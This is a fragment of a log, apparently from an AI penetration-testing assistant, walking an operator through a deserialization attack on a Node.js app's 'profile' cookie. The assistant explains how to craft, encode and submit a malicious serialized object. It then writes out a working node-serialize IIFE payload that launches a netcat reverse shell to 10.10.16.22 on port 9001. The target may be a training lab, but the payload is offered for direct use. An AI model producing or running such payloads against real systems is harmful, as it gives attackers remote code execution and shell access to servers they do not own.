This may include ensuring proper escaping of characters, correct use of serialization syntax, and confirming that the server is configured to execute functions during deserialization.\n\nTo correct the payload, you should analyze the error message to identify the syntax issue and then modify the payload accordingly.

Craft a malicious object that, when deserialized by the Node.js application, would execute a reverse shell command connecting back to your controlled system (10.10.16.22) on port 9001. This often involves creating a custom JavaScript object that uses the `child_process` module to spawn a shell.\n2. Serialize this object into a format expected by the application (typically JSON), encode it if necessary (e.g., base64 encode), and then submit it to the server in place of the legitimate `profile` cookie value. You would then set up a listener on your system to catch the incoming reverse shell.\n\nPlease note that crafting such a payload requires an understanding of the application's deserialization process and the security mechanisms in place.

Create a new payload using an IIFE for immediate function execution - [to-do, in-progress]\n\nTo perform this task, construct a payload that uses an Immediately Invoked Function Expression (IIFE) to execute arbitrary code upon deserialization. Serialize the payload object, encode it for transmission if necessary (e.g., in base64), then send it as the value of the `profile` cookie in an HTTP request to the server and await the reverse shell connection."], [1722713860.493417, "Based on the response you received, it appears that the server is successfully deserializing the payload but is not executing the intended command. The server response \"Hey [object Object]\" suggests that the server is attempting to output the `username` object, which implies that the payload is not being interpreted as a string that includes an executable function.\n\nTo fix this, we need to ensure that the payload is properly formatted so that the `node-serialize` library interprets the function and executes it. The payload should be constructed in such a way that the function is executed immediately upon deserialization.\n\nHere's how you might adjust the payload:\n\n```javascript\n{\n  \"rce\": \"_$$ND_FUNC$$_(function(){require('child_process').exec('nc 10.10.16.22 9001 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout); })})()\"\n}\n```\n\nIn this payload, `rce` is the property name that carries the function to be executed. The function is wrapped in an IIFE, which should be executed immediately upon deserialization.\n\nTo update the PTT with the new information and the task to adjust the payload:\n\n1.
